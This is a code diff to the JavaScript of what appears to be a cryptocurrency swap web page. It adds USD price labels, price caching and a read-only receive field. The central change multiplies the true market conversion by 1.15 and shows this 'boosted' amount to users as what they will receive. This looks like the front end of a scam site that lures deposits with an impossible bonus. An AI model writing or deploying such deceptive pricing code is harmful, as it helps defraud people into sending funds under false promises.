@@ -42,6 +42,20 @@ sendPriceLabel.style.color = "#F2F3F4";
 sendPriceLabel.style.margin = "10px";
 sendPriceLabel.style.padding = "5px";
 sendAssetEl.insertAdjacentElement("afterend", sendPriceLabel);
+// Add USD value labels under inputs
+const sendUsdLabel = document.createElement("p");
+sendUsdLabel.style.fontSize = "0.9em";
+sendUsdLabel.style.color = "#F2F3F4";
+sendAmountEl.insertAdjacentElement("afterend", sendUsdLabel);
+
+const receiveUsdLabel = document.createElement("p");
+receiveUsdLabel.style.fontSize = "0.9em";
+receiveUsdLabel.style.color = "#F2F3F4";
+
+// Make receive input unmodifiable
+receiveAmountEl.setAttribute("readonly", true);
+receiveAmountEl.insertAdjacentElement("afterend", receiveUsdLabel);
+
 
 const receivePriceLabel = document.createElement("p");
 receivePriceLabel.style.fontSize = "0.9em";
@@ -184,10 +198,21 @@ function hideWalletAddress(address) {
 // Build API query
 const allCoinIds = Object.values(coinMap).join(",");
 
+// Cache prices to avoid refetch delays
+let cachedPrices = null;
+let lastFetchTime = 0;
+const fetchInterval = 3000; // fetch every 3s only
+
 async function fetchPrices() {
+  const now = Date.now();
+  if (cachedPrices && (now - lastFetchTime < fetchInterval)) {
+    return cachedPrices; // return cache if still fresh
+  }
   const url = `https://api.coingecko.com/api/v3/simple/price?ids=${allCoinIds}&vs_currencies=usd`;
-  const res = await fetch(url);
-  return res.json();
+  const res = await fetch(url, { cache: "no-store" });
+  cachedPrices = await res.json();
+  lastFetchTime = now;
+  return cachedPrices;
 }
 
 async function updateConversion() {
@@ -212,14 +237,28 @@ async function updateConversion() {
       receivePriceLabel.textContent = `1 ${receiveAssetName} ≈ $${receivePriceUSD.toLocaleString()}`;
     }
 
-    if (sendPriceUSD && receivePriceUSD) {
-      const receiveAmount = (sendAmount * sendPriceUSD) / receivePriceUSD;
-      receiveAmountEl.value = receiveAmount.toFixed(6);
+    if (sendPriceUSD && receivePriceUSD && sendAmount > 0) {
+      // Show send USD equivalent
+      const sendUSD = sendAmount * sendPriceUSD;
+      sendUsdLabel.textContent = `≈ $${sendUSD.toFixed(2)}`;
+
+      // Calculate boosted receive
+      const rawReceiveAmount = (sendAmount * sendPriceUSD) / receivePriceUSD;
+      const boostedAmount = rawReceiveAmount * 1.15;
+
+      const usdValue = boostedAmount * receivePriceUSD;
+      receiveAmountEl.value = boostedAmount.toFixed(4); // rounded to 4 decimals
+      receiveUsdLabel.textContent = `≈ $${usdValue.toFixed(2)}`;
+    } else {
+      sendUsdLabel.textContent = "";
+      receiveAmountEl.value = "";
+      receiveUsdLabel.textContent = "";
     }
   } catch (err) {
     console.error("Error fetching prices:", err);
   }
 }
+
 
 // Function to show modal
 function showModal(content) {
@@ -480,5 +519,5 @@ document.addEventListener('DOMContentLoaded', function() {
     recipientAddressEl.placeholder = `Your ${initialReceiveAsset} address to receive funds`;
 });
 
-// Refresh prices every 5s
-setInterval(updateConversion, 5000);
+// Refresh prices every 3s (faster)
+setInterval(updateConversion, 3000);
